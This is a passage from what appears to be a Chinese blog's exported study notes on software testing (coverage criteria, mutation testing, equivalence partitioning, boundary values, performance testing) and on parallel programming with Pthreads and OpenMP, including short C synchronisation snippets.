变量 `v` 的du-path集合，从 `li` 开始\n  - `du(v)` 变量 `v` 的du-path集合\n##### 全定义覆盖（All Defs Coverage）\n- 衡量被测代码中变量的每个定义得到使用的程度\n- 全定义覆盖的正式定义为：测试集合T满足全定义覆盖，当且仅当对于数据流图中每个变量$v_i$的每个定义处$d_j$，执行T产生的完整路径集合L中存在一条路径$l \\in L$的某个子路径$\\pi$，满足$\\pi \\in du(d_j, v_i)$。若$def(v_i)$是变量$v_i$在数据流图中定义处的集合，$\\Pi^D_L (v_i) = \\{\\pi | \\pi \\in du(d_j,v_i), \\pi 是l \\in L的子路径\\}$，且满足$\\Pi^D_L (v_i)$的任意两个元素是$v_i$的不同定义处开始的定义使用路径，则测试集合T的全定义覆盖率判定覆盖度：\n$\\frac{\\Sigma^m_{i=1} ||\\Pi^D_L (v_i)||}{\\Sigma^m_{i=1} ||def(v_i)||}∗ 100\\%，m为程序中变量的个数$\n##### 全使用覆盖（All Uses Coverage）\n- 衡量被测代码中变量的每个使用得到执行的程度\n- 全使用覆盖的正式定义为：测试集合T满足全使用覆盖，当且仅当对于数据流图中每个变量$v_i$的每个定义$d_j$的每个使用$u_k$，执行T产生的完整路径集合L中存在一条路径$l \\in L$的某个子路径$\\pi$，满足$\\pi \\in du(d_j,u_k, v_i)$。若$use(v_i)$是变量$v_i$在数据流图中定义使用对的集合，$\\Pi^U_L (v_i) = \\{\\pi | \\pi \\in du(d_j,u_k,v_i), \\pi 是l \\in L的子路径\\}$，且满足$\\Pi^U_L (v_i)$的任意两个元素是$v_i$的不同定义处开始和使用处结束的定义使用路径，则测试集合T的全使用覆盖率为：\n$\\frac{\\Sigma^m_{i=1} ||\\Pi^U_L (v_i)||}{\\Sigma^m_{i=1} ||use(v_i)||}∗ 100\\%，m为程序中变量的个数$\n##### 全定义使用覆盖（All du path Coverage）\n- 衡量被测代码中变量的每条定义使用路径得到执行的程度。\n- 全定义使用路径覆盖的正式定义为：测试集合T满足全定义使用路径覆盖，当且仅当对于数据流图中每个变量$v_i$的每条定义使用路径，执行T产生的完整路径集合L中存在一条路径$l \\in L$的某个子路\n径$\\pi$，满足$\\pi \\in du(v_i)$。若$du(v_i)$是变量𝑣𝑖在数据流图中定义使用路径集合，$\\Pi_L (v_i) = \\{\\pi | \\pi \\in du(v_i), \\pi 是l \\in L的子路径\\}$，则测试\n集合T的全定义使用路径覆盖率为：\n$\\frac{\\Sigma^m_{i=1} ||\\Pi_L (v_i)||}{\\Sigma^m_{i=1} ||du(v_i)||}∗ 100\\%，m为程序中变量的个数$\n\n#### 基于变异\n变异测试是通过在被测对象中引入错误并计算出发现的错误数量来**评估测试集的缺陷检测能力**。\n- **应该在代码中引入哪些类型的bug？**\n- 如何在代码中引入错误？\n- **当我们说发现一个bug时，我们应该参考什么标准？**\n- 如何表达一个测试集的缺陷检测能力？\n##### 强杀死变异\n给定一个程序P的变异体$m \\in M$和一个测试t，当且仅当t在P上的输出与t在m的输出不同时，就说t强杀死变异m\n###### 强变异覆盖（SMC）\n对于每一个$m \\in M$，如果一个测试集能够强杀死m，那么其满足SMC\n\n强杀死变异体意味着在测试集中有一个测试用例满足变异体的可达性、感染性和**传播性**\n##### 弱杀死变异\n给定一个程序P的变异体$m \\in M$和一个测试t，当且仅当t在P上的执行状态与t在m上的执行状态不同时，我们称t弱杀死变异m\n###### 弱变异覆盖（WMC）\n对于每一个$m \\in M$，如果一个测试集能够弱杀死m，那么其满足WMC\n\n弱杀死变异体意味着在测试集中有一个测试用例满足变异体的可达性和感染性，但不满足**传播性**\n##### 变异得分\nMS(T) = |D|/(|L|+|D|)\n- |D|：被杀死的变异体的数量\n- |L|：存活的变异体的数量\n## 面向接口的功能测试\n### 接口测试介绍\n- 将通过单元测试的代码单元逐渐集成在一起直至整个软件系统，以验证**单元之间的接口交互**是否满足需求\n- 接口：不同的系统或者一个系统中不同的组件之间相互交互的部分\n#### HTTP方法\n|-|GET|POST|PUT|HEAD|DELETE|OPTIONS|CONNECT|PATCH|TRACE|\n|-|-|-|-|-|-|-|-|-|-|\n|请求信息是否有Body部分|否|是|是|否|可以有|否|否|是|否|\n|成功的响应是否含有Body|是|是|否|否|可以有|否|否|否|否|\n|安全|是|否|否|是|否|是|是|否|否|\n|幂等|是|否|是|是|是|是|是|否|是|\n|缓存|是|可能|否|是|否|否|否|否|否|\n|是否支持HTML表单|是|是|否|否|否|否|否|否|否|\n\n- 安全：请求会修改服务器资源\n- 幂等：对一个请求而言，执行一次和多次效果相同\n- 缓存：用以减少请求的处理和响应时间(大响应); 请求包消息头的标头一般使用\n默认值，响应包消息头涉及3个标头：Cache-Control，Etag，Last-Modified\n### 接口测试设计\n#### 等价划分\n- 等价划分是一种经典的分而治之的测试设计方法\n-  对分析得到的每个被测因素的输入域以预期结果相同为等价划分原则，划分为不同的等价类集合，划分需满足：\n   - 划分覆盖整个待测试域\n   - 各个划分部分之间没有交集\n   - 以被测因素的约束为标准，划分需包括\n     - 有效等价类：符合约束的等价类\n     - 无效等价类：不符合约束的所有其它可能存在的情况\n\n##### 等价划分启发式规则\n- 如果某个输入条件规定值的范围，可以确定一个有效等价类和两个无效等价类\n- 如果输入条件规定了一个输入值的集合，可以确定一个有效等价类和一个无效等价类\n- 如果输入条件是一个布尔表达式的条件，可以确定一个有效等价类和一个无效等价类\n- 如果输入条件定义了一个“必须”的情况，比如”标识的第一字符必须是字母”那么可以确定一个有效等价类和一个无效等价类\n- 如果有理由确信，某一等价类中的各元素在程序中的处理有区别，那就把这个等价类分成更小的等价类\n##### 等价划分组合\n- 弱一般等价类\n  - 只考虑测试因素的有效等价类\n  - 要求每个测试因素的**每个有效等价类出现一次**\n- 强一般等价类\n  - 只考虑测试因素的有效等价类\n  - 要求测试测试因素的**有效等价类的全组合**\n- 弱健壮等价类\n  - 即考虑有效也考虑无效等价类\n  - 对于有效等价类，每个测试因素的**每个有效等价类出现一次**\n  - 对于无效等价类，要求每次组合考虑**一个测试因素的一个无效等价类，其余测试因素使用有效等价类**\n- 强健壮等价类\n  - 即考虑有效也考虑无效等价类\n  - 要求测试因素的**等价类的全组合**\n#### 边界测试\n- 边界值：任何值得测试的范围的临界点，**通常指等价类的边界**，可分为\n  - 边界值：明确地定义在规格说明书中\n  - 次边界：隐含在软件中必须经过分析才能获得\n  - 仅物理量适用，逻辑变量慎重\n- 测试设计思想\n  - 取边界点附近的值作为测试用例的输入，可参考如下的设计原则\n  - 如果输入条件定义了数值区间(a,b)，那么测试用例应包括a、b、稍微比a大、稍微比b大、稍微比a小和稍微比b小等几种情况\n\n从理论上来说，边界值可分为\n- 仅考虑有效区间单个变量边界值（**一般边界值**）：用在最小值，略高于最小值，正常值，略低于最大值和最大值处取变量的值。如果被测变量个数为n，则测试用例个数为4n+1\n- 仅考虑有效区间多个变量边界值同时作用（**一般最坏情况边界值**）：用各个变量的最小值，略高于最小值，正常值，略低于最大值和最大值的笛卡尔积集。如果被测变量个数为n，则测试用例个数为5n\n- 同时考虑有效区间和无效区间单个变量边界值（**健壮边界值**）：除了在最小值，略高于最小值，正常值，略低于最大值和最大值处取变量的值，还要在略超过最大值以及略小于最小值之处值。如果被测变量个数为n，则测试用例个数为6n+1\n- 同时考虑有效区间和无效区间多个变量边界值同时作用（**健壮最坏情况边界值**）：用各个变量的略小于最小值，最小值，略高于最小值，正常值，略低于最大值，最大值和略超过大值的完全组合。如果被测变量个数为n，则测试用例个数为7n\n## 面向系统的功能测试\n测试级别最高的一种测试活动，是将已经集成好的软件系统，作为整个基于计算机系统的一个元素，与计算机硬件、外设、某些支持软件、数据和人员等其它系统元素结合在一起， 在实际运行（使用）环境下，对计算机系统进行一系列的组装测试和确认测试\n- 系统测试的对象不仅包括软件，还包括系统软件所依赖的硬件、外部设备和各类接口，其目的在于通过与系统的需求定义作比较，发现软件与系统定义不符合或与之矛盾的地方以及系统各个部分是否可以协调工作\n- 系统测试分为两大类别\n  - 功能测试\n  - 非功能测试\n### 功能测试用例设计\n#### 输入域划分\n##### 输入域\n一个输入域分类必须满足以下两个性质：\n- 覆盖整个输入域（完备性）\n- 分类之间没有重叠（独特性）\n##### 输入域建模\n- 识别待测因素\n- 找到待测特征\n- 划分待测特征\n##### 输入域组合策略\n- ACoC全组合值覆盖\n  - 必须使用所有特征中的所有特征块组合\n  - 数量：$\\Pi^Q_{i=1}|B_i|$\n- ECC单值覆盖\n  - 每个特征块的一个值必须至少用于一个测试用例中\n  - 数量：$Max^Q_{i=1}|B_i|$\n- PWC全对偶值覆盖\n  - 每个特征的每个块的值必须与每个其他特征的每个块的值相结合\n  - 数量：$(Max^Q_{i=1}|B_i|)*(Max^Q_{j=1,j\\neq i}|B_j|)$\n- TWC全T值覆盖\n  - 全对偶覆盖的拓展。需覆盖到t个待测特征之间的关系\n- BCC基本值覆盖\n  - 基本值：某个待测特征所有输入域划分取值中，使用频率最高的那个取值\n  - 一次针对一个被测特征，用其非基本值替代基本值，其余被测特征仍取基本值\n  - 数量：$1+\\sum^Q_{i=1}(B_i-1)$\n- MBCC多基本值覆盖\n  - 如果待测特征有多个基本值，那么就要覆盖到所有基本值，其余仍然是对每个待测特征取非基本值\n#### 决策表\n由四个区域组成：\n- condition stub：条件名称列表\n- action stub：如果规则得到满足，例程将采取或启动的动作\n- condition entry：条件的组合\n- action entry：在条件组合下采取的行动\n\n表中的每一列都是一条规则，它规定了action stub中指定的行动将在哪些条件下发生\n一个规则就是一个测试用例\n#### 正交实验法\n从大量的实验点中挑选出适量的、有代表性的点，依据相应的正交表，合理地安排实验的一种科学的实验设计方法\n\n- 因子：有可能影响实验指标的条件\n- 因子的水平（或状态）：影响实验因子的因素，在正交表中用“0-水平数-1”或“1-水平数”表示\n- 正交表：记为L次数（水平数因子数）， 例如$L_8(4^1 \\times 2^4)$表示实验次\n数为8，1个4水平的因子，4个2水平的因子\n\n##### 测试思想\n- 根据被测软件的规格说明书找出影响其功能实现的操作对象和外部因素，把它们当作因子，而把各个因子的取值当作状态，构造出二元的因素分析表；然后，利用正交表进行各因子的状态组合，构造有效的测试输入数据集\n  - 正交表的因子对应被测对象的测试因素\n  - 因子的水平可以看成是各测试因素的取值\n#### 场景法\n\n### 功能测试用例实现\n#### Automata Theoretic Approach\nW method：用于给定一个FSM作为输入，可以求出能揭错该FSM的所有输入序列\n#### Control Theoretic Approach\nCoverage Based Method\n## 面向系统的非功能测试\n### 性能测试\n#### 性能测试基础\n##### 用户关注的性能\n- 软件对用户操作的响应时间，即从单击一个按钮、一个链接开始，到应用系统把本次操作的结果以用户能察觉的方式展示出来的过程所耗费的时间\n- 用户所感受到的响应时间既包括客观成分，也包括主观成分\n\n##### 系统管理员关注的性能\n- 一类特殊的用户，同样关心响应时间\n- 与系统资源状态相关的信息\n- 与系统的可扩展性、并发能力、最大容量相关的信息\n\n##### 开发人员关注的性能\n- 同样关心响应时间，也同样关系管理员性能\n- 最关注的是使性能表现不佳的因素和由于大量用户访问引发的软件故障\n\n##### Web前端性能\n- 考察的主要是浏览器的展现和脚本执行时间，与服务器本身并无太大的关系，也与并发用户量的大小并无非常直接的关系\n- Web应用的前端响应时间指**浏览器的页面加载时间**\n  - 浏览器的页面加载时间：包括HTML的解析、对页面上的图片及CSS等文件的获取和加载、客户端脚本Javascript的执行时间以及对页面进行展示所花费的时间\n  - **性能黄金法则**：只有10%-20%的最终用户响应时间耗费在下载HTML文档上，其余的80-90%耗费在了下载页面中的所有组件上\n  - 高性能前端：如何提高浏览器下载和执行资源的并发性，如何让浏览器尽快开始渲染页面，如何让浏览器尽可能充分地利用缓存等问题是前端性能关注的主要问题\n#### 性能测试分类\n##### 常规的性能测试\n- 正常条件下进行的测试，主要测试正常使用时系统是否满足要求，同时可能为了保留系统的扩展空间而进行一些稍稍超出“正常”范围的测试。\n##### 压力测试\n- 在高负载下或极限负载下的测试，更侧重于确定在什么负载条件下系统性能处于失效状态并以此来获得系统能提供的最大服务级别的测试\n- 其目的在于发现在什么条件下系统的性能会变得不可接受\n##### 峰值测试\n- 测试系统在高峰交易时段的性能\n##### 容量测试\n- 通过不断增加负载直至系统崩溃，确定系统能够正常运行的最大负载\n##### 强度测试\n- 迫使系统在异常的资源配置下运行以检查程序对异常情况的抵抗能力，判断系统的稳定性以及系统未来的扩展空间，例\n- 运行CPU使用率在90%左右时以上的场景\n- 正常压力为点击率“1000/s”，那么测试“2000/s”\n##### 疲劳测试\n- 连续长时间的性能测试，发现内存泄漏等问题","tags":["测试"],"categories":["计软杂谈","学习笔记"]},{"title":"并行程序设计 学习笔记","url":"/reimu-lighthouse/20230128/parallel-programming-design/","content":"## intro\n并行计算:\n- 表示一个系统具有多个处理器, 所有处理器可以访问共享存储器以交换信息，通信开销低\n\n分布式计算:\n- 每个系统具有自己的存储器，并通过网络将多个系统连通，系统间通过消息传递的方式交换信息，通信开销高\n\nAmdahl定律\n- 加速比 $S =\\frac{1}{(1 – a + a/n)}$\n- $a$：可并行计算部分的占比\n- $n$：并行处理节点个数\n### 并行开销\n寻找到足够多的并行任务，是实现预期加速的最大障碍\n并行开销包括：\n- 启动线程或进程的成本  \n- 共享数据的通信成本  \n- 同步的成本  \n- 额外的(冗余)计算\n\n在某些系统上，每一种开销都可能是毫秒级(数百万次浮点运算)。\n权衡：算法需要足够大的工作集(即大粒度)以快速的并行运行，但又不能太大以至于没有足够的并行任务\n\n## FP\n### 并行计算机体系结构\n- 单指令多数据流机SIMD（Single-Instruction Multiple-Data）\n- 并行向量处理机PVP（Parallel Vector Processor）\n- 对称多处理机SMP（Symmetric Multiprocessor）\n- 大规模并行处理机MPP (Massively Parallel Processor)\n- 工作站机群COW (Cluster of Workstation)\n- 分布式共享存储DSM (Distributed Shared Memory) 多处理机\n\n|属性|PVP|SMP|MPP|DSM|COW|\n|-|-|-|-|-|-|\n|结构类型|MIMD|MIMD|MIMD|MIMD|MIMD|\n|处理器类型|专用定制|商用|商用|商用|商用|\n|互联网络|定制交叉开关|总线、交叉开关|定制网络|定制网络|商用网络以太、ATM|\n|通信机制|共享变量|共享变量|消息传递|共享变量|信息传递|\n|地址空间|单地址空间|单地址空间|多地址空间|单地址空间|多地址空间|\n|系统存储器|集中共享|集中共享|分布非共享|分布共享|分布非共享|\n|访问模型|UMA|UMA|NORMA|NUMA|NORMA|\n\n- 均匀存储访问模型－ UMA\n- 非均匀存储访问模型－ NUMA\n- 全高速缓存访问模型－COMA\n- 高速缓存一致性非均匀存储访问模型－CC-NUMA\n- 非远程存储访问模型－NORMA\n\n#### UMA访存模型\nUMA（Uniform Memory Access）模型是均匀存储访问模型的简称。其特点是：\n- 物理存储器被所有处理器均匀共享\n- 所有处理器访问任何存储字取相同的时间\n- 每台处理器可带私有高速缓存\n- 外围设备也可以一定形式共享\n\n#### NUMA访存模型\nNUMA(Nonuniform Memory Access)模型是非均匀存储访问模型的简称。特点是：\n- 被共享的存储器在物理上是分布在所有的处理器中的，其所有本地存储器的集合就组成了全局地址空间；\n- 处理器访问存储器的时间是不一样的；访问本地存储器LM或群内共享存储器CSM较快，而访问外地的存储器或全局共享存储器GSM较慢(此即非均匀存储访问名称的由来)；\n- 每台处理器可拥有私有高速缓存，外设也可以某种形式共享\n\n#### COMA访存模型\nCOMA(Cache-Only Memory Access)模型是全高速缓存存储访问的简称。其特点是：\n- 各处理器节点中没有存储层次结构，全部高速缓存组成了全局地址空间\n- 利用分布的高速缓存目录D进行远程高速缓存的访问\n- COMA中的高速缓存容量一般都大于二级高速缓存容量\n- 使用COMA时，数据开始时可任意分配，因为在运行时它最终会被迁移到要用到它们的地方。\n\n\n#### CC-NUMA访存模型\nCC-NUMA（Coherent-Cache Nonuniform Memory Access）模型是高速缓存一致性非均匀存储访问模型的简称。其特点是：\n- 大多数使用基于目录的高速缓存一致性协议\n- 保留SMP结构易于编程的优点，也改善常规SMP的可扩放性\n- CC-NUMA实际上是一个分布共享存储的DSM多处理机系统\n- 它最显著的优点是程序员无需明确地在节点上分配数据，系统的硬件和软件开始时自动在各节点分配数据，在运行期间，高速缓存一致性硬件会自动地将数据迁移至要用到它的地方\n\n#### NORMA访存模型\nNORMA（No-Remote Memory Access）模型是非远程存储访问模型的简称。NORMA的特点是：\n- 所有存储器是私有的\n- 绝大数NUMA都不支持远程存储器的访问\n- 在DSM中，NORMA就消失了\n### 并行程序开发方法\n|并行层次|粒度（指令数）|并行实施|编程支持|\n|-|-|-|-|\n|甚细粒度指令级并行|几十条，如多指令发射、内存交叉存取|硬件处理器|\n|细粒度数据级并行|几百条，如循环指令块|编译器|\t共享变量|\n|中粒度控制级并行|几千条，如过程、函数|程序员（编译器）|共享变量、消息传递|\n|粗粒度任务级并行|数万条，如独立的作业任务|操作系统|消息传递|\n\n- 主-从式（Master-Slave）\n- 单程序多数据流（Single Program Multiple Data ）\n- 数据流水线（Data Pipelining）\n- 分治策略（Divide and Conquer）\n#### 主-从式（Master-Slave）\n基本思想是：将一个待求解的任务分成一个**主任务**（主进程）和一些**从任务**（子进程）\n- 主进程负责将任务的分解、派发和收集诸各子任务的求解结果并最后汇总得到问题的最终解\n- 各子进程接收主进程发来的消息；并行进行各自计算；向主进程发回各自的计算结果\n\n#### 单程序多数据流（SPMD）\n基本思想是：并行运行的进程均执行**相同的代码段**，但处理的**数据不同**\n- 首先将应用程序的数据预先分配给各个计算进程（处理器）\n- 然后计算进程并行的完成各自的计算任务，包括计算过程中各进程间的数据交换（进行通信同步）\n- 最后将计算结果汇集起来\n\n#### 数据流水线（Data Pipelining）\n基本思想是：**将计算进程组织成一条流水线**，每个进程执行特定的计算任务（相当于流水线的一个阶段）\n- 将任务在功能上划分成一些子任务（进程），这些子任务完成某种特定功能的计算工作\n- 一旦前一个子任务完成，后继的子任务就可立即开始\n- 整个计算过程中各进程之间的通信仅发生在相邻的阶段之间，且通信可以完全异步地进行\n\n#### 分治策略（Divide and Conquer）\n基本思想是：将一个大而复杂的问题分解成若干个**特性相同的子问题**分而治之\n- 若所得的子问题规模仍嫌过大，则可反复使用分治策略，直至很容易求解诸子问题为止\n- 问题求解可分为三步：①将输入分解成若干个**规模近似相等**的子问题；②同时**递归地**求解诸子问题；③归并各子问题的解成为原问题的解\n\n#### PCAM\n设计并行应用的四个阶段：\n- 划分(**P**artitioning)\n- 通信(**C**ommunication)\n- 组合(**A**gglomeration)\n- 映射(**M**apping)\n\n划分：分解成小的任务，开拓并发性\n通信：确定诸任务间的数据交换，监测划分的合理性\n组合：依据任务的局部性，组合成更大的任务\n映射：将每个任务分配到处理器上，提高并行性能\n\n#### 域分解\n- 划分的**对象是数据**，可以是程序中的输入数据、中间处理数据和输出数据\n- 将数据分解成大致相等的小数据片\n- 划分时考虑数据上的相应操作\n- 如果一个任务需要别的任务中的数据，则会产生任务间的通信\n\n#### 功能分解\n- 划分的**对象是计算**（亦称为任务分解或计算划分），将计算划分为不同的任务，其出发点不同于域分解\n- 划分后，研究不同任务所需的数据。如果这些数据不相交的，则划分是成功的；如果数据有相当的重叠， 意味着存 在大量的通信开销，要重新进行域分解和功能分解\n- 功能分解是一种更深层次的分解\n\n#### 通信分析\n通信是PCAM设计过程的重要阶段；\n划分产生的各任务，一般不能完全独立执行，需要在任务间进行数据交流，从而产生了通信；\n功能分解确定了各任务间的数据流；\n各任务是并发执行的，通信则限制了这种并发性；\n\n四种通信模式\n- 局部/全局通信\n- 结构化/非结构化通信\n- 静态/动态通信\n- 同步/异步通信\n\n#### 局部通信\n通信限制在一个邻域内，即局部内通信\n\n#### 全局通信\n通信是全局的，例如：\n- All to All\n- Master-Worker\n\n#### 结构化通信\n每个任务的通信模式是相同的\n\n#### 非结构化通信\n没有一个统一的通信模式，例如：无结构化网格\n\n#### 静态/动态通信\n静态通信中，通信伙伴的身份不随时间改变\n动态通信中，通信伙伴的身份则可能由运行时所计算的数据决定且是可变的\n\n#### 同步/异步通信\n同步通信时，接收方和发送方协同操作\n异步通信中，接收方获取数据无需与发送方协同\n\n## SMP\n### 共享内存系统\n- 每个处理器拥有私有存储（缓存）\n- 所有处理器共享内存空间\n- 处理器可以并行进行计算\n### 共享数据访问\n- 竞争条件（Race Condition）\n\t- 当执行的结果取决于两个或多个事件的执行时间时，就存在竞争条件\n- 临界区（Critical Section）\n\t- 对共享存储区域进行更新的代码段，或会造成竞争条件的代码段\n- 原子性（Atomicity）\n\t- 指事务的不可分割性，一个事务的所有操作要么不间断地全部被执行，要么一个也没有执行\n- 互斥锁（Mutual Exclusion）\n\t- 在编程中，引入了对象互斥锁的概念，来保证共享数据操作的完整性。某段代码被标记了互斥锁，那么在任何情况下，最多只能有一个线程可以执行该段代码\n- 路障（Barrier）\n\t- 同步点又称为路障(barrier)，只有所有线程都抵达此路障，线程才能继续运行下去，否则会阻塞在路障处\n## PThread\nPthreads 不是编程语言，而是POSIX 线程库，也经常称为Pthreads 线程库\n- 定义了一套多线程编程的应用程序编程接口（API）\n- 在支持POSIX 的系统( Linux 、Mac OS X 、Solaris 、HPUX 等)上才有效\n\nPthreads线程库支持：\n- 创建并行环境\n- 同步\n- 隐式通信\n### 启动线程\n函数原型：\n```c\nint pthread_create(pthread_t *, const pthread_attr_t *, void * (*)(void *), void *);\n```\n调用示例： \n```c\nerrcode = pthread_create(&thread_id, &thread_attribute, &thread_fun, &fun_arg);\n```\n- `thread_id`是线程id或句柄\n- `thread_attribute`属性，通过传递NULL指针获得标准默认值\n- `thread_fun`要运行的函数(获取并返回void*)  \n- `fun_arg`可以传递给`thread_fun`的参数  \n- 如果创建操作失败，错误代码将被设置为非零 \n```c\npthread_create(&thread_handles[thread],NULL,Hello, (void*) thread);\n```\n### 停止线程\n函数原型：\n```c\nint pthread_join(pthread_t,void **);\n```\n调用示例： \n```c\nerrcode = pthread_create(thread_id,return);\n```\n- `thread_id`是线程id，函数等待`thread_id`对象关联的线程结束\n- `return`参数可以接收该线程产生的返回值\n```c\npthread_join(thread_handles[thread], NULL);\n```\n### 互斥锁\n- Pthreads线程库定义了互斥锁变量类型：`pthread_mutex_t`\n- 特殊类型的变量，通过某些特殊类型的函数，互斥锁可以用来限制每次只有一个线程能进入临界区\n- 使用`pthread_mutex_t`类型的变量前，必须初始化\n```c\nint pthread_mutex_init(pthread_mutex_t* mutex_p, const pthread _mutexattr_t* attr_p);\n```\n- 使用结束后回收空间\n```c\n int pthread_mutex_destroy(pthread_mutex_t* mutex_p) ;    \n```\n- 线程调用`pthread_mutex_lock`函数获得互斥锁\n```c\nint pthread_mutex_lock(pthread_mutex_t* mutex_p);\n```\n- 线程执行完临界区代码后，需要调用`pthread_mutex_unlock`函数释放互斥锁的使用权\n```c\nint pthread_mutex_unlock(pthread_mutex_t* mutex_p);\n```\n\n```c\npthread_mutex_t mutex;/*全局变量*/\n/*主函数*/\npthread_mutex_init(&mutex, NULL); /*互斥锁初始化*/\n/*多线程并行执行函数部分*/        \npthread_mutex_lock(&mutex);\nsum+=my_sum;\npthread_mutex_unlock(&mutex);\n/*主函数*/\npthread_mutex_destroy(&mutex);/*回收互斥锁空间*/\n```\n### 信号量\n信号量可以认为是一种特殊类型的`unsigned int`变量，可以赋值为0 、1 、2 ……，\n- 只有0 和1 值的信号量称为二元信号量\n\n互斥量最大的区别在于信号量没有个体拥有权，主线程信号量初始化，所有线程都可以通过调用`sem_post`和`sem_wait`函数更新信号量的值\n需要链接信号量函数库\n```c\n#include <semaphore.h>\n```\n- 使用信号量前，需要初始化\n```c\nint sem_init(sem_t* semaphore_p, int shared, unsigned initial_val);\n```\n- 结束后回收\n```c\nint sem_destroy(sem_t* semaphore_p);\n```\n- 线程再临界区前调用函数`sem_wait`函数：\n```c\nint sem_wait(sem_t* semaphore_p);\n```\n- 如果信号量值为0，则线程阻塞\n- 如果信号量值为非0，则将信号量值减1\n- 线程执行完临界区后调用函数`sem_wait`函数：\n```c\nint sem_post(sem_t* semaphore_p);\n```\n- 信号量的值加1 \n\n```c\nsem_t sem;/*全局变量*/\n/*主函数*/\n sem_init(&sem, 0, 1);/*信号量初始值为1*/\n/*多线程并行执行函数部分*/        \nsem_wait(&sem);\nsum+=my_sum;\nsem_post(&sem);\n/*主函数*/\nsem_destroy(&sem);/*回收信号量空间*/\n```\n### 条件变量\n条件变量是一种数据对象，允许线程在某个条件或事件发生前都处于挂起状态\n另一个线程可以通过信号来唤醒挂起的线程\n条件变量为共享变量，需要与互斥锁一起使用\n- 使用`pthread_cond_t`类型的变量前，必须初始化\n```c\nint pthread_cond_init(pthread_cond_t* cond_p, const pthread _condattr_t* cond_attr_p);\n```\n- 使用结束后回收空间\n```c\nint pthread_cond_destroy(pthread_cond_t* cond_p);    \n```\n- 唤醒一个阻塞的线程\n```c\nint pthread_cond_signal(pthread_cond_t* cond_p);  \n```\n- 唤醒所有阻塞的线程\n```c\nint pthread_cond_broadcast(pthread_cond_t* cond_p);  \n```\n- 使用互斥锁阻塞线程\n```c\nint pthread_cond_wait(pthread_cond_t* cond_p, pthread_mutex_t* mutex_p);\n```\n\n```c\n/*调用pthread_cond_wait等同于执行如下语句*/\npthread_mutex_unlock(&mutex_p);\nwait_on_signal(&cond_p); \npthread_mutex_lock(&mutex_p);\n```\n\n### 同步\n#### 忙等待和互斥锁实现路障\n```c\n/*路障*/\npthread_mutex_lock(&barrier_mutex);\ncounter++;\npthread_mutex_unlock(&barrier_mutex);\nwhile(counter < thread_count);\n```\n#### 信号量实现路障\n```c\nSem_t count_sem; /*初始值为1*/\nSem_t barrier_sem; /*初始值为0*/\n/*多线程并行执行函数部分*/ \n/*路障*/\nSem_wait(&count_sem);\nif(counter == thread_count-1){\n\tcounter = 0;\n\tsem_post(&count_sem);\n\tfor(j=0;j<thread_count-1;j++)\n\t\tsem_post(&barrier_sem); /*最后一个线程唤醒前面阻塞的thread_count-1个线程*/\n}else{\n\tcounter++;\n\tsem_post(&count_sem);\n\tsem_wait(&barrier_sem);\n}\n```\n#### 条件变量实现路障\n```c\n/*共享变量*/\nint counter = 0;\npthread_mutex_t mutex_p;\npthread_cond_t cond_p;\n/*多线程并行执行函数部分*/\n/*路障*/\npthread_mutex_lock(&mutex_p);\ncounter++;\nif (counter == thread_count){\n\tcounter = 0;\n\tpthread_cond_broadcast(&cond_p);\n}else{\n\twhile(pthread_cond_wait(&cond_p,&mutex_p) != 0);\n\t/*除了pthread_cond_broadcast，可能有其他事件唤醒线程，因此需要将pthread_cond_wait放进while循环中*/\n}\npthread_mutex_unlock(&mutex_p);\n```\n## OpenMP\n由三个主要API组件构成：\n- 编译器指令\n- 运行时库函数\n- 环境变量\n\n支持以增量方式并行化(Incremental Parallelization)串行程序\n基于线程的并行编程模型\n需要编译器的支持\n### 准备工作和编译制导\n- `#include <omp.h>`\n\t- 包含OpenMP的库函数头文件\n- `#pragma omp parallel private(nthreads, tid)`\n\t- 并行区域的编译制导语句\n\t- 大小写敏感\n\t- 指令最多应用于一个后继语句，语句必须是一个结构块（structured block）\n\n### 并行区域结构（Parallel Construct）\n基本的OpenMP并行结构，Fork-Join模型\n```c\n#pragma omp parallel [[clause[[,]clause]…] \n\tstructured-block\nclause:\n\tif(scalar-expression)\n\tnum_threads(integer-expression)\n\tdefault(shared | none)\n\tprivate(list)\n\tfirstprivate(list)\n\tshared(list)\n\tcopyin(list)\n\treduction(reduction-identifier: list)\n```\n- 并行区域是多线程执行的代码块，是基本的OpenMP并行结构\n- 一个线程执行到一个并行指令时，Fork一组线程并成为该线程组的主线程（线程号为0）\n- 从并行区域开始，代码被复制，一组线程都执行该代码\n- 并行区域出口隐含barrier，只有主线程继续执行\n#### 用于显示定义变量范围的子句\n- **private(list)**：将list中的变量声明为每个线程的私有变量\n\t- 为线程组中每个线程声明一个相同类型的变量\n\t- 作用域只在并行区域内\n- **shared(list)**：将list中的变量声明为线程组中线程之间的共享变量\n- **default(shared | none)**：指定并行区域内变量的属性是shared，none作为默认值要求程序员必须显式地限定所有变量的作用域\n- **firstprivate(list)**：在进入并行区域之前进行一次初始化，让并行区域的list中变量的值初始化为同名共享变量的值\n- **lastprivate(list)**：在退出并行区域时，将并行区域的list中变量的值赋值给同名的共享变量\n\t- 循环迭代：将最后一次循环迭代中的值赋给对应的共享变量\n\t- section结构：将语法上最后一个section语句中的值赋给对应的共享变量\n- **copyin(list)**：将主线程中threadprivate变量的值拷贝到执行并行区域的各个线程的threadprivate变量中，list包含要复制的变量的名称\n\t- threadprivate是指令，指定全局变量被所有线程各自产生一个私有的副本，对于不同并行区域之间的同一个线程，该副本变量是共享的\n- **copyprivate(list)**：将单个线程私有list变量的值广播到其他线程的私有list变量\n\t- 只用于single指令，在一个single块的结尾处完成广播操作\n- **reduction(reduction-identifier: list)** ：对list中的变量进行约简操作\n\t- 为每个线程创建并初始化list中变量的私有副本（list中变量为共享变量）\n\t- 对所有线程的私有副本进行约简操作，并将最终结果写入共享变量\n#### if子句\n- **if(scalar-expression)**：如果有if子句，那么只有表达式为真（非0）才会创建一个线程组，否则该区域由主线程串行执行\n#### num_threads子句\n- **num_threads(integer-expression)**：用于设置运行并行区域的线程数量，integer-expression表示线程数量\n- 并行区域的线程数量由以下因素决定，优先级从高到低：\n\t- if子句的记过\n\t- num_threads子句的设置\n\t- omp_set_num_threads()库函数的设置\n\t- OMP_NUM_THREADS环境变量的设置\n\t- 编译器默认实现（一般默认总线程数等于处理器的核心数）\n### 使用限制\n- 并行区域不能是跨越多个程序或代码文件的结构化块\n- 从一个并行区域只能由一个入口和一个出口，任何转入和转出都是非法的\n\t- 不能包含break语句\n- 只允许一个if子句和一个num_threads子句\n- 程序运行结果不能依赖于子句的顺序\n\n\n### 工作共享结构(Worksharing Constructs)\n- 工作共享结构不会启动新线程，为了使指令能够并行执行，必须将工作共享结构封装在一个并行区域中\n- 